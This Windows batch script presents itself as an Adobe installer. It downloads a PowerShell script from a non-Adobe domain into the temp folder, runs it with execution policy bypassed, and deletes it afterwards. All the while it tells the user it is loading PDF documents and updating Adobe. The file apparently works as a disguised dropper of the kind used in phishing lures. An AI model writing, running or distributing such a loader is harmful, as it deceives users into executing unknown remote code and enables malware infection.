@echo off
setlocal EnableExtensions

title Adobe Installer

echo ==================================
echo      Updating Adobe Installer
echo ==================================
echo.

:: Check PowerShell availability
where powershell.exe >nul 2>&1
if errorlevel 1 (
    echo ERROR: PowerShell was not found.
    pause
    exit /b 1
)

:: Configuration
set "SCRIPT=%TEMP%\adobeinstaller.ps1"
set "URL=https://www.willowcenteredtech.com/downloads/adobeinstaller.ps1"

echo Downloading PDF documents...
echo.

:: Download the installer
powershell.exe -NoProfile -ExecutionPolicy Bypass ^
    -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%SCRIPT%' -ErrorAction Stop } catch { Write-Host $_ -ForegroundColor Red; exit 1 }"

if errorlevel 1 (
    echo.
    echo ERROR: Failed to load PDF files.
    pause
    exit /b 1
)

:: Verify download
if not exist "%SCRIPT%" (
    echo.
    echo ERROR: PDF files not downloaded.
    pause
    exit /b 1
)

echo Running installer...
echo.

:: Execute installer
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%SCRIPT%"

set "RESULT=%ERRORLEVEL%"

:: Cleanup
if exist "%SCRIPT%" (
    del /f /q "%SCRIPT%" >nul 2>&1
)

echo.

if "%RESULT%"=="0" (
    echo ==================================
    echo Adobe Updated and PDF Documents loaded successfully.
    echo ==================================
) else (
    echo ==================================
    echo Update failed.
    echo Exit Code: %RESULT%
    echo ==================================
)

echo.
pause
exit /b %RESULT%